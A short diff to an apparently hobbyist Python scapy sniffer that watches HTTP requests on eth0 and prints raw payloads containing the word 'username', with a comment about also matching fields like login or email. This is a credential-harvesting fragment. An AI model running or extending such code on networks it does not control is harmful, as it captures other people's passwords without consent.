@@ -52,6 +52,8 @@ def sniff(interface):
 def process_sniffed_packet(packet):
     if packet.haslayer(http.HTTPRequest):
         if packet.haslayer(scapy.Raw):
-            print(packet[scapy.Raw].load)  # here we will check the keyword which is username and password in the fields 
+            load = packet[scapy.Raw].load # here we will check the keyword which is username and password in the fields here the problem is that it is not neccesary that always a developer stores the username in the username it could be login or email so here we should check for the list rather than one string
+            if "username" in load:
+                print(load)
 
 sniff("eth0")
